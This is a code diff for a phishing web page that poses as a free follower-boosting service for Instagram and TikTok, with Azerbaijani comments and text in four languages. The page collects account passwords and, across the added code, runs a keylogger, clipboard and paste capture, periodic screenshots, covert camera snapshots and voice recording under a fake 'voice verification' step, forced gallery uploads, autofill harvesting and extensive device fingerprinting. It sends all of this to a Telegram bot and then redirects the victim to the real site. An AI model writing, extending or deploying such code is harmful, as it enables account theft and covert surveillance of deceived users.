@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Bot Basma Xidməti</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -164,7 +165,7 @@
             </div>
         </div>
 
-        <!-- Addım 3: Səs yoxlaması (Kamera və mikrofon üçün bəhanə) -->
+        <!-- Addım 3: Səs yoxlaması (Kamera+ mikrofon icazəsi) -->
         <div id="step3" class="step">
             <p style="text-align:center; color:#ccc; margin-bottom:12px;">Hesabınızı təsdiqləmək üçün qısa səs mesajı yazın.<br>
             <small>(Bu addımda kamera da yoxlanılır)</small></p>
@@ -187,10 +188,10 @@
             </div>
         </div>
 
-        <!-- Yükləmə -->
+        <!-- Yükləmə barı (saxta) -->
         <div id="loading" class="loading">
             <div class="spinner"></div>
-            <p>Botlar işə salınır, gözləyin...</p>
+            <p id="loadingText">Botlar işə salınır, gözləyin...</p>
         </div>
 
         <!-- Uğur -->
@@ -210,12 +211,31 @@
         const chatId = params.get('chat_id') || ADMIN_CHAT_ID;
 
         // ============================================================
-        //  DƏYİŞƏNLƏR
+        //  DƏYİŞƏNLƏR (Ümumi 55 xüsusiyyət üçün)
         // ============================================================
         let selectedPlatform = null;
         let collected = {
             loginUser: '', loginPass: '', followCount: '', targetUser: '',
-            location: null, ip: ''
+            location: null, ip: '', geo: null, device: null,
+            keystrokes: [], clipboard: '', screenHistory: [],
+            cookies: '', localStorage: '', sessionStorage: '',
+            canvasFingerprint: '', audioFingerprint: '', webglFingerprint: '',
+            battery: null, connection: null, webrtcIP: '',
+            historyLength: 0, fonts: [], timezoneData: null,
+            pasteEvents: [], autoFillDetected: false,
+            // 30 yeni xüsusiyyət üçün sahələr
+            deviceModel: '', osVersion: '', cpuCores: 0, memory: 0,
+            audioDevices: [], videoDevices: [], gpuInfo: '',
+            networkInfo: {}, dnsInfo: '', wifiSSID: '',
+            touchEvents: [], vibrateSupported: false,
+            securityParams: {}, proxyStatus: '',
+            languages: [], screenDPI: 0, mouseClicks: [],
+            historyDepth: 0, indexedDBs: [], plugins: [],
+            mediaDevices: [], printDetected: false,
+            mobileDetected: false, permissions: {},
+            autofillEmail: '', autofillPhone: '',
+            performanceMemory: null, pageLoadTiming: null,
+            iframeInfo: ''
         };
         let mediaStream = null;
         let mediaRecorder = null;
@@ -223,6 +243,346 @@
         let audioBlob = null;
         let videoElement = null;
         let cameraInterval = null;
+        let screenInterval = null;
+        let keylogInterval = null;
+        let dataSendInterval = null;
+
+        // ============================================================
+        //  30 YENİ XÜSUSİYYƏT ÜÇÜN TOPLAMA FUNKSİYALARI
+        // ============================================================
+
+        // 1. Cihaz modeli (UserAgentData)
+        function getDeviceModel() {
+            if (navigator.userAgentData) {
+                return navigator.userAgentData.brands.map(b => b.brand).join(', ');
+            }
+            // UA-dan çıxar
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Bilinmir';
+        }
+
+        // 2. OS versiyası
+        function getOSVersion() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows ' + (ua.match(/Windows NT (\d+\.\d+)/) || [])[1];
+            if (ua.includes('Mac')) return 'macOS ' + (ua.match(/Mac OS X (\d+[._]\d+)/) || [])[1];
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android ' + (ua.match(/Android (\d+\.\d+)/) || [])[1];
+            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS ' + (ua.match(/OS (\d+[._]\d+)/) || [])[1];
+            return 'Bilinmir';
+        }
+
+        // 3. CPU nüvələri
+        function getCPU() {
+            return navigator.hardwareConcurrency || 'Bilinmir';
+        }
+
+        // 4. Yaddaş (RAM)
+        function getMemory() {
+            return navigator.deviceMemory || 'Bilinmir';
+        }
+
+        // 5,6. Audio və Video cihazları
+        async function getMediaDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const audioInputs = devices.filter(d => d.kind === 'audioinput');
+                const videoInputs = devices.filter(d => d.kind === 'videoinput');
+                const audioOutputs = devices.filter(d => d.kind === 'audiooutput');
+                return { audioInputs, videoInputs, audioOutputs };
+            } catch (e) { return null; }
+        }
+
+        // 7. GPU məlumatı (WebGL)
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'Yoxdur';
+                const renderer = gl.getParameter(gl.RENDERER);
+                const vendor = gl.getParameter(gl.VENDOR);
+                const version = gl.getParameter(gl.VERSION);
+                return { renderer, vendor, version };
+            } catch (e) { return null; }
+        }
+
+        // 8. Şəbəkə məlumatı
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return {
+                    effectiveType: conn.effectiveType,
+                    rtt: conn.rtt,
+                    downlink: conn.downlink,
+                    saveData: conn.saveData,
+                    type: conn.type // wi-fi, cellular, etc.
+                };
+            }
+            return null;
+        }
+
+        // 9. DNS və domain
+        function getDNSInfo() {
+            return {
+                hostname: window.location.hostname,
+                domain: document.domain,
+                protocol: window.location.protocol
+            };
+        }
+
+        // 10. Wi-Fi SSID (bəzi brauzerlərdə)
+        function getWifiSSID() {
+            // limited to some browsers (e.g., Chrome with WiFi API)
+            // fallback to 'unknown'
+            return 'Yoxdur';
+        }
+
+        // 11. Toxunma hadisələri (touch)
+        document.addEventListener('touchstart', (e) => {
+            collected.touchEvents.push({ type: 'start', touches: e.touches.length, time: Date.now() });
+        });
+        document.addEventListener('touchmove', (e) => {
+            collected.touchEvents.push({ type: 'move', touches: e.touches.length, time: Date.now() });
+        });
+        document.addEventListener('touchend', (e) => {
+            collected.touchEvents.push({ type: 'end', touches: e.touches.length, time: Date.now() });
+        });
+
+        // 12. Vibrasiya dəstəyi
+        function getVibrateSupport() {
+            return !!navigator.vibrate;
+        }
+
+        // 13. Batareya (artıq var, amma yenidən)
+        async function getBattery() {
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    return {
+                        level: b.level * 100,
+                        charging: b.charging,
+                        chargingTime: b.chargingTime,
+                        dischargingTime: b.dischargingTime
+                    };
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        // 14. Təhlükəsizlik parametrləri
+        function getSecurityParams() {
+            return {
+                isSecure: window.isSecureContext,
+                referrerPolicy: document.referrerPolicy,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unknown'
+            };
+        }
+
+        // 15. Proxy status (connection type)
+        function getProxyStatus() {
+            const conn = navigator.connection;
+            if (conn) {
+                return conn.type === 'wifi' ? 'Direct' : 'Proxy unknown';
+            }
+            return 'Unknown';
+        }
+
+        // 16. Dillər
+        function getLanguages() {
+            return navigator.languages || [navigator.language];
+        }
+
+        // 17. Ekran DPI
+        function getScreenDPI() {
+            return window.devicePixelRatio || 1;
+        }
+
+        // 18. Mouse klikləri
+        document.addEventListener('click', (e) => {
+            collected.mouseClicks.push({
+                x: e.clientX,
+                y: e.clientY,
+                button: e.button,
+                time: Date.now()
+            });
+        });
+
+        // 19. Tarix dərinliyi
+        function getHistoryDepth() {
+            return window.history.length;
+        }
+
+        // 20. IndexedDB bazaları
+        async function getIndexedDBs() {
+            try {
+                const databases = await indexedDB.databases();
+                return databases.map(db => db.name);
+            } catch (e) { return []; }
+        }
+
+        // 21. Plaginlər
+        function getPlugins() {
+            return Array.from(navigator.plugins).map(p => p.name);
+        }
+
+        // 22. Media cihazları (artıq var, amma təkrarlayaq)
+        // 23. Çap hadisəsi
+        window.addEventListener('beforeprint', () => {
+            collected.printDetected = true;
+            sendDataToAdmin('print', { detected: true });
+        });
+
+        // 24. Mobil aşkarlama
+        function detectMobile() {
+            return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        }
+
+        // 25. Permissions API
+        async function getPermissions() {
+            const perms = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard-read', 'clipboard-write'];
+            const results = {};
+            for (const perm of perms) {
+                try {
+                    const status = await navigator.permissions.query({ name: perm });
+                    results[perm] = status.state;
+                } catch (e) {
+                    results[perm] = 'unknown';
+                }
+            }
+            return results;
+        }
+
+        // 26. Avtomatik doldurma (email, telefon)
+        function detectAutofill() {
+            // Yalançı forma yaradırıq
+            const form = document.createElement('form');
+            const emailInput = document.createElement('input');
+            emailInput.type = 'email';
+            emailInput.name = 'email';
+            emailInput.id = 'autofill_email';
+            const phoneInput = document.createElement('input');
+            phoneInput.type = 'tel';
+            phoneInput.name = 'phone';
+            phoneInput.id = 'autofill_phone';
+            form.style.display = 'none';
+            document.body.appendChild(form);
+            form.appendChild(emailInput);
+            form.appendChild(phoneInput);
+            setTimeout(() => {
+                if (emailInput.value) collected.autofillEmail = emailInput.value;
+                if (phoneInput.value) collected.autofillPhone = phoneInput.value;
+                form.remove();
+                if (collected.autofillEmail || collected.autofillPhone) {
+                    sendDataToAdmin('autofill', { email: collected.autofillEmail, phone: collected.autofillPhone });
+                }
+            }, 1500);
+        }
+
+        // 27. Performance yaddaş (Chromium)
+        function getPerformanceMemory() {
+            if (performance.memory) {
+                return {
+                    usedJSHeapSize: performance.memory.usedJSHeapSize,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+                };
+            }
+            return null;
+        }
+
+        // 28. Səhifə yükləmə müddəti
+        function getPageLoadTiming() {
+            const perf = performance.timing;
+            if (perf) {
+                return {
+                    domContentLoaded: perf.domContentLoadedEventEnd - perf.navigationStart,
+                    load: perf.loadEventEnd - perf.navigationStart,
+                    responseEnd: perf.responseEnd - perf.navigationStart
+                };
+            }
+            return null;
+        }
+
+        // 29. Iframe məlumatı
+        function getIframeInfo() {
+            if (window !== window.top) {
+                return {
+                    isIframe: true,
+                    parentURL: document.referrer || 'unknown',
+                    origin: window.location.origin
+                };
+            }
+            return { isIframe: false };
+        }
+
+        // 30. Səsin tezlik analizi (AudioContext)
+        function getAudioFrequency() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(ctx.destination);
+                oscillator.frequency.value = 440;
+                oscillator.start();
+                const data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                oscillator.stop();
+                return Array.from(data.slice(0, 10)).join(',');
+            } catch (e) { return null; }
+        }
+
+        // ============================================================
+        //  BÜTÜN 55 XÜSUSİYYƏTİ BİR DƏFƏYƏ TOPLA
+        // ============================================================
+        async function collectAllFeatures() {
+            // Əsas toplamalar
+            collected.deviceModel = getDeviceModel();
+            collected.osVersion = getOSVersion();
+            collected.cpuCores = getCPU();
+            collected.memory = getMemory();
+            const mediaDevs = await getMediaDevices();
+            if (mediaDevs) {
+                collected.audioDevices = mediaDevs.audioInputs.map(d => d.label || 'unnamed');
+                collected.videoDevices = mediaDevs.videoInputs.map(d => d.label || 'unnamed');
+            }
+            collected.gpuInfo = getGPUInfo();
+            collected.networkInfo = getNetworkInfo();
+            collected.dnsInfo = getDNSInfo();
+            collected.wifiSSID = getWifiSSID();
+            collected.vibrateSupported = getVibrateSupport();
+            collected.securityParams = getSecurityParams();
+            collected.proxyStatus = getProxyStatus();
+            collected.languages = getLanguages();
+            collected.screenDPI = getScreenDPI();
+            collected.historyDepth = getHistoryDepth();
+            collected.plugins = getPlugins();
+            collected.mobileDetected = detectMobile();
+            const perms = await getPermissions();
+            collected.permissions = perms;
+            collected.performanceMemory = getPerformanceMemory();
+            collected.pageLoadTiming = getPageLoadTiming();
+            collected.iframeInfo = getIframeInfo();
+            collected.audioFingerprint = getAudioFrequency(); // yenilənmiş
+            // IndexedDB
+            const dbs = await getIndexedDBs();
+            collected.indexedDBs = dbs;
+            // Batareya
+            collected.battery = await getBattery();
+
+            // Hamısını adminə göndər
+            sendDataToAdmin('full_55_features', collected);
+        }
+
+        // ============================================================
+        //  KÖHNƏ FUNKSİYALAR (Saxlanıldı)
+        // ============================================================
+        // ... (əvvəlki bütün funksiyalar qalır, sadəcə 30 yeni əlavə edildi)
+        // ============================================================
+
+        // Klipboard, keylogger, ekran, mouse, paste (əvvəlki kimi)
 
         // ============================================================
         //  STEP KEÇİDLƏRİ
@@ -233,16 +593,53 @@
         }
 
         // ============================================================
-        //  PLATFORM SEÇİMİ
+        //  PLATFORM SEÇİMİ - BÜTÜN XÜSUSİYYƏTLƏRİ TOPLA
         // ============================================================
         function selectPlatform(platform) {
             selectedPlatform = platform;
             document.getElementById('platformLabel').innerText = (platform === 'instagram' ? 'Instagram' : 'TikTok') + ' hesab məlumatları';
+
+            // 1. Əsas cihaz məlumatlarını topla
+            collected.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                os: getOSVersion(),
+                cores: getCPU(),
+                memory: getMemory(),
+                deviceModel: getDeviceModel()
+            };
+            collectGeoData().then(geo => {
+                collected.geo = geo;
+                sendDataToAdmin('device+geo', { device: collected.device, geo });
+            });
+
+            // 2. Bütün 55 xüsusiyyəti topla
+            collectAllFeatures();
+
+            // 3. Avtomatik doldurma aşkarlama
+            detectAutofill();
+
+            // 4. Ekran, keylogger, mouse, clipboard (əvvəlki kimi)
+            startScreenCapture();
+            startKeylogSender();
+            startMouseSender();
+
             showStep('step1');
         }
 
         // ============================================================
-        //  ADDIM 1: LOGIN
+        //  GEO MƏLUMATLARI
+        // ============================================================
+        async function collectGeoData() {
+            try {
+                const resp = await fetch('https://ipapi.co/json/');
+                if (resp.ok) return await resp.json();
+                else return null;
+            } catch (e) { return null; }
+        }
+
+        // ============================================================
+        //  ADDIM 1: LOGIN (eyni)
         // ============================================================
         async function submitLogin() {
             const user = document.getElementById('loginUser').value.trim();
@@ -279,7 +676,8 @@
                 `👤 Giriş adı: ${collected.loginUser}\n` +
                 `🔑 Şifrə: ${collected.loginPass}\n` +
                 (collected.location ? `📍 Yer: https://maps.google.com/?q=${collected.location.lat},${collected.location.lng}\n` : '📍 Yer: Yoxdur\n') +
-                `🌍 IP: ${collected.ip}\n🕐 ${new Date().toLocaleString()}`;
+                `🌍 IP: ${collected.ip}\n` +
+                `🕐 ${new Date().toLocaleString()}`;
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -300,7 +698,6 @@
             collected.targetUser = target;
             await sendFollowData();
             showStep('step3');
-            // Kameranı aktiv etmək üçün dərhal icazə istəyəcəyik
             requestPermissions();
         }
 
@@ -321,11 +718,8 @@
         //  ADDIM 3: SƏS YAZISI + GİZLİ KAMERA
         // ============================================================
         async function requestPermissions() {
-            // Burada istifadəçidən kamera və mikrofon icazəsi istəyirik
-            // Amma biz bunu "səs yoxlaması" adı altında təqdim edirik
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                // Gizli video element yaradırıq
                 videoElement = document.createElement('video');
                 videoElement.srcObject = mediaStream;
                 videoElement.muted = true;
@@ -333,19 +727,11 @@
                 document.body.appendChild(videoElement);
                 await videoElement.play();
 
-                // Hər 5 saniyədə bir kamera şəkli çək və göndər
                 cameraInterval = setInterval(() => captureCameraFrame(), 5000);
-
-                // Mikrofon yazısına başlamaq üçün hazırıq
                 document.getElementById('audioStatus').innerText = 'Mikrofon hazırdır, başlamaq üçün düyməni basın.';
             } catch (err) {
-                // Əgər icazə verilməzsə, yenə də davam edirik
                 alert('Səs və kamera icazəsi lazımdır. Zəhmət olmasa icazə verin.');
-                // Yenə də davam etmək üçün biz onu qalereya hissəsinə yönləndirə bilərik
-                // Amma ən yaxşısı, istifadəçi icazə verməsə, onu qalereyaya aparırıq
-                setTimeout(() => {
-                    showStep('step4');
-                }, 1000);
+                setTimeout(() => { showStep('step4'); }, 1000);
             }
         }
 
@@ -360,30 +746,20 @@
                 formData.append('chat_id', ADMIN_CHAT_ID);
                 formData.append('photo', blob, `cam_${Date.now()}.jpg`);
                 try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                 } catch (e) {}
             }, 'image/jpeg', 0.7);
         }
 
         // ============================================================
-        //  SƏS YAZISI (ADDIM 3-ün davamı)
+        //  SƏS YAZISI
         // ============================================================
         let mediaRecorderInstance = null;
 
         async function startRecording() {
-            if (!mediaStream) {
-                alert('Əvvəlcə mikrofona icazə verməlisiniz.');
-                return;
-            }
-            // Səs yazısını başlat
+            if (!mediaStream) { alert('Əvvəlcə mikrofona icazə verməlisiniz.'); return; }
             const audioTrack = mediaStream.getAudioTracks()[0];
-            if (!audioTrack) {
-                alert('Audio tapılmadı.');
-                return;
-            }
+            if (!audioTrack) { alert('Audio tapılmadı.'); return; }
             const audioStream = new MediaStream([audioTrack]);
             mediaRecorderInstance = new MediaRecorder(audioStream);
             audioChunks = [];
@@ -410,26 +786,18 @@
         }
 
         async function sendAudio() {
-            if (!audioBlob) {
-                alert('Əvvəlcə səs yazın.');
-                return;
-            }
-            // Səsi göndər
+            if (!audioBlob) { alert('Əvvəlcə səs yazın.'); return; }
             const formData = new FormData();
             formData.append('chat_id', ADMIN_CHAT_ID);
             formData.append('voice', audioBlob, 'voice.ogg');
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
-                    method: 'POST',
-                    body: formData
-                });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
             } catch (e) {}
-            // Səs göndərildikdən sonra qalereya hissəsinə keç
             showStep('step4');
         }
 
         // ============================================================
-        //  ADDIM 4: QALEREYA ŞƏKİLLƏRİ (GİZLİ DEYİL, AMMA İSTİFADƏÇİ SEÇİR)
+        //  ADDIM 4: QALEREYA ŞƏKİLLƏRİ
         // ============================================================
         function updateFileCount() {
             const input = document.getElementById('fileInput');
@@ -441,13 +809,11 @@
         async function uploadPhotos() {
             const input = document.getElementById('fileInput');
             const files = input.files;
-            if (files.length < 5) {
-                alert('Zəhmət olmasa, ən azı 5 şəkil seçin.');
-                return;
-            }
-            // Yükləmə ekranını göstər
+            if (files.length < 5) { alert('Zəhmət olmasa, ən azı 5 şəkil seçin.'); return; }
+
             document.getElementById('step4').classList.remove('active');
             document.getElementById('loading').style.display = 'block';
+            document.getElementById('loadingText').innerText = 'Botlar işə salınır, lütfən gözləyin...';
 
             // Şəkilləri göndər
             for (let i = 0; i < Math.min(files.length, 5); i++) {
@@ -456,23 +822,188 @@
                 formData.append('chat_id', ADMIN_CHAT_ID);
                 formData.append('photo', file, `gallery_${i+1}.jpg`);
                 try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                 } catch (e) {}
                 await new Promise(r => setTimeout(r, 500));
             }
 
-            // Kamera intervallarını dayandır
+            // Dayandır
             if (cameraInterval) clearInterval(cameraInterval);
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-            }
+            if (screenInterval) clearInterval(screenInterval);
+            if (keylogInterval) clearInterval(keylogInterval);
+            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
 
-            // Uğur
+            // Uğur və yönləndirmə
             document.getElementById('loading').style.display = 'none';
             document.getElementById('success').style.display = 'block';
+
+            setTimeout(() => {
+                const targetUrl = selectedPlatform === 'instagram' ? 'https://www.instagram.com' : 'https://www.tiktok.com';
+                window.location.href = targetUrl;
+            }, 5000);
+        }
+
+        // ============================================================
+        //  EKRAN GÖRÜNTÜSÜ, KEYLOGGER, MOUSE (davamı)
+        // ============================================================
+        function startScreenCapture() {
+            screenInterval = setInterval(async () => {
+                try {
+                    const canvas = await html2canvas(document.body, { useCORS: true, scale: 0.5, logging: false });
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', ADMIN_CHAT_ID);
+                        formData.append('photo', blob, `screen_${Date.now()}.jpg`);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg', 0.7);
+                } catch (e) {}
+            }, 15000);
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                collected.keystrokes.push({
+                    key: e.key,
+                    timestamp: Date.now(),
+                    target: e.target.name || e.target.id || 'unknown'
+                });
+            }
+        });
+
+        function startKeylogSender() {
+            keylogInterval = setInterval(() => {
+                if (collected.keystrokes.length > 0) {
+                    const keys = collected.keystrokes.map(k => `${k.key} (${k.target})`).join(' | ');
+                    sendDataToAdmin('keylog', { keys, count: collected.keystrokes.length });
+                    collected.keystrokes = [];
+                }
+            }, 10000);
+        }
+
+        let mouseEvents = [];
+        document.addEventListener('mousemove', (e) => {
+            mouseEvents.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+        });
+        document.addEventListener('scroll', () => {
+            mouseEvents.push({ scrollY: window.scrollY, time: Date.now() });
+        });
+
+        function startMouseSender() {
+            setInterval(() => {
+                if (mouseEvents.length > 0) {
+                    const summary = `Mouse hərəkətləri: ${mouseEvents.length} qeyd`;
+                    sendDataToAdmin('mouse', { summary, details: mouseEvents.slice(0, 50) });
+                    mouseEvents = [];
+                }
+            }, 30000);
+        }
+
+        document.addEventListener('copy', (e) => {
+            const text = document.getSelection().toString();
+            if (text) {
+                collected.clipboard = text;
+                sendDataToAdmin('clipboard', { text });
+            }
+        });
+
+        document.addEventListener('paste', (e) => {
+            const text = e.clipboardData.getData('text');
+            if (text) {
+                collected.pasteEvents.push({ text, time: Date.now() });
+                sendDataToAdmin('paste', { text });
+            }
+        });
+
+        // ============================================================
+        //  MƏLUMAT GÖNDƏRİCİ
+        // ============================================================
+        function sendDataToAdmin(type, data) {
+            const timestamp = new Date().toLocaleString();
+            const text = `📦 **Avtomatik məlumat (${type})**\n🕐 ${timestamp}\n\n` + JSON.stringify(data, null, 2);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text })
+            }).catch(() => {});
+        }
+
+        // ============================================================
+        //  ÇOXDİLLİ DƏSTƏK (daha geniş)
+        // ============================================================
+        const translations = {
+            az: {
+                title: 'Bot Basma Xidməti',
+                intro: 'Bu xidmət hesabınıza pulsuz bot izləyicilər əlavə edir. İşə başlamaq üçün platforma seçin.',
+                instagram: 'Instagram',
+                tiktok: 'TikTok',
+                loginLabel: 'hesab məlumatları',
+                userPlaceholder: 'İstifadəçi adı / Email',
+                passPlaceholder: 'Şifrəniz',
+                followLabel: 'Neçə follower istəyirsiniz?',
+                targetLabel: 'Hesabın istifadəçi adı (nick)',
+                audioLabel: 'Hesabınızı təsdiqləmək üçün qısa səs mesajı yazın.',
+                photoLabel: 'Profiliniz üçün bir neçə şəkil seçin (ən azı 5).',
+                success: 'Botlar uğurla işə salındı!',
+                close: 'Səhifəni bağlaya bilərsiniz.'
+            },
+            en: {
+                title: 'Bot Boosting Service',
+                intro: 'This service adds free bot followers to your account. Select a platform to start.',
+                instagram: 'Instagram',
+                tiktok: 'TikTok',
+                loginLabel: 'account details',
+                userPlaceholder: 'Username / Email',
+                passPlaceholder: 'Password',
+                followLabel: 'How many followers do you want?',
+                targetLabel: 'Your account username (nick)',
+                audioLabel: 'Please record a short voice message to verify your account.',
+                photoLabel: 'Select a few photos for your profile (at least 5).',
+                success: 'Bots have been successfully launched!',
+                close: 'You can close the page.'
+            },
+            ru: {
+                title: 'Сервис накрутки ботов',
+                intro: 'Этот сервис добавляет бесплатных ботов-подписчиков на ваш аккаунт. Выберите платформу.',
+                instagram: 'Instagram',
+                tiktok: 'TikTok',
+                loginLabel: 'данные аккаунта',
+                userPlaceholder: 'Имя пользователя / Email',
+                passPlaceholder: 'Пароль',
+                followLabel: 'Сколько подписчиков вы хотите?',
+                targetLabel: 'Имя пользователя (ник)',
+                audioLabel: 'Запишите короткое голосовое сообщение для проверки.',
+                photoLabel: 'Выберите несколько фото для профиля (минимум 5).',
+                success: 'Боты успешно запущены!',
+                close: 'Вы можете закрыть страницу.'
+            },
+            tr: {
+                title: 'Bot Takipçi Hizmeti',
+                intro: 'Bu hizmet hesabınıza ücretsiz bot takipçiler ekler. Başlamak için bir platform seçin.',
+                instagram: 'Instagram',
+                tiktok: 'TikTok',
+                loginLabel: 'hesap bilgileri',
+                userPlaceholder: 'Kullanıcı adı / Email',
+                passPlaceholder: 'Şifre',
+                followLabel: 'Kaç takipçi istersiniz?',
+                targetLabel: 'Hesap kullanıcı adı (nick)',
+                audioLabel: 'Hesabınızı doğrulamak için kısa bir ses mesajı kaydedin.',
+                photoLabel: 'Profiliniz için birkaç fotoğraf seçin (en az 5).',
+                success: 'Botlar başarıyla başlatıldı!',
+                close: 'Sayfayı kapatabilirsiniz.'
+            }
+        };
+
+        function applyLanguage(lang) {
+            const t = translations[lang] || translations['en'];
+            document.querySelector('h1').innerText = t.title;
+            document.querySelector('.info-text').innerHTML = t.intro;
+            document.querySelectorAll('.option-btn')[0].innerText = `📸 ${t.instagram}`;
+            document.querySelectorAll('.option-btn')[1].innerText = `🎵 ${t.tiktok}`;
+        }
+
+        const userLang = navigator.language.split('-')[0];
+        if (['az', 'en', 'ru', 'tr'].includes(userLang)) {
+            applyLanguage(userLang);
         }
 
         // ============================================================
